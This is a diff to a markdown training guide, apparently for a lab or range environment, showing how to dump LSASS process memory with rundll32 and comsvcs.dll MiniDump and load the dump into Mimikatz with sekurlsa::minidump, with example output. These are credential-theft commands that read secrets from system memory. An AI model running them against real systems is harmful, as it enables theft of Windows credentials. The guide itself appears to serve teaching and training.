@@ -221,17 +221,21 @@ Many methods exist to dump LSASS, but we'll be covering a method that uses a LOL
     - For example, in our test enviornment, the PID for LSASS was `1372`. Thus, we would want to run:
     
         ```
-        rundll32.exe c:\Windows\system32\comsvcs.dll, MiniDump 1372 C:\Windows\temp\mini.dump full
+        rundll32.exe c:\Windows\system32\comsvcs.dll, MiniDump 1372 C:\windows\temp\lsass.dmp full
         ```
-
-    !!! RYAN FINISH ME !!!
-    !!! RYAN FINISH ME !!!
-    !!! RYAN FINISH ME !!!
 
 1. In Mimikatz, and this can be done "offline", load the LSASS dump you obtained:
     
     ```
     mimikatz # sekurlsa::minidump lsass.dmp
+    ```
+    
+    Example output if you run in the range (i.e. not offline, but rather point Mimikatz to the file you dumped):
+    
+    ```
+    sekurlsa::minidump C:\windows\temp\lsass.dmp
+    
+    Switch to MINIDUMP : 'C:\windows\temp\lsass.dmp'
     ```
 
 1. Now that you have loaded the dumped LSASS memory space, you can now run Mimikatz against the dump file:
